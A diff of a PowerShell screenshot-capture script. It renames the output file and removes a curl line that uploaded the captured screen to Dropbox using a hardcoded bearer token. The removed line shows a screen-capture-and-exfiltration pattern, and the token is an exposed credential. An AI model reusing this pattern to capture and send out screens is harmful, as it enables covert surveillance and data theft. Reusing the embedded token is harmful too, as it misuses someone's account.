@@ -1,7 +1,7 @@
 #############################################################################
 # Capturing a screenshot
 #############################################################################
-$File = "C:\\MuchFun\\MyFancyScreenshot.bmp"
+$File = "C:\\MuchFun\\MyFancyScreenshot"
 Add-Type -AssemblyName System.Windows.Forms
 Add-type -AssemblyName System.Drawing
 # Gather Screen resolution information
@@ -18,5 +18,4 @@ $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 # Save to file
 $bitmap.Save($File) 
-curl -X POST https://content.dropboxapi.com/2/files/upload  --header "Authorization: Bearer 7JJkhlXm9DUAAAAAAAAAAeeRVJ0MoYaEu70Mvc-7lYDpbTLx8XBThUKfKfq05GFW "  --header "Dropbox-API-Arg: {\"path\": \"/MyFancyScreenshot.bmp\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}" --header "Content-Type: application/octet-stream" --data-binary @MyFancyScreenshot.bmp
 #############################################################################
